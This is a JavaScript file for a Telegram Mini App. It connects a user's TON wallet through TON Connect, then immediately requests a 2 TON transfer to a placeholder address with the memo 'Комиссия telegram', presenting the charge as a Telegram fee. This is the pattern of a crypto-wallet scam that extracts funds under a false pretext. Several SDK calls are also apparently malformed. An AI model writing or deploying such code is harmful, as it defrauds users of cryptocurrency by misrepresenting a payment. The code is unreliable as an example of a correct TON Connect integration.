let tg = window.Telegram.WebApp;
tg.expand();

// === Функция загрузки TON Connect SDK ===
async function loadTonConnect() {
    return new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src = "https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest";
        script.onload = () => {
            console.log("✅ TON Connect SDK загружен!");
            resolve();
        };
        script.onerror = (error) => {
            console.error("❌ Ошибка загрузки TON Connect SDK!", error);
            reject(error);
        };
        document.head.appendChild(script);
    });
}

// === Функция подключения кошелька TON ===
async function connectWallet() {
    try {
        await loadTonConnect();

        if (typeof window.TonConnect === "undefined") {
            console.error("❌ TON Connect НЕ загружен!");
            alert("❌ Ошибка загрузки TON Connect. Попробуйте снова.");
            return;
        }

        const tonConnect = new TonConnect({
            manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
        });

        const connectedWallet = await tonConnect.connect();
        if (!connectedWallet) {
            console.error("❌ Ошибка: Кошелек не подключился");
            alert("❌ Ошибка подключения");
            return;
        }

        const walletAddress = connectedWallet.account.address;
        tg.sendData(JSON.stringify({ wallet: walletAddress }));
        alert("✅ Кошелек подключен: " + walletAddress);

        // === Создаем транзакцию на 2 TON ===
        const transaction = {
            to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС", // Адрес получателя
            value: "2000000000", // 2 TON (в нанотонах)
            payload: "Комиссия telegram"
        };

        await tonConnect.sendTransaction(transaction);
        alert("✅ Транзакция на 2 TON отправлена!");
    } catch (error) {
        console.error("❌ Ошибка при подключении:", error);
        alert("❌ Ошибка: " + error.message);
    }
}

// === Назначаем обработчик на кнопку ===
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("connect-wallet").addEventListener("click", connectWallet);
});

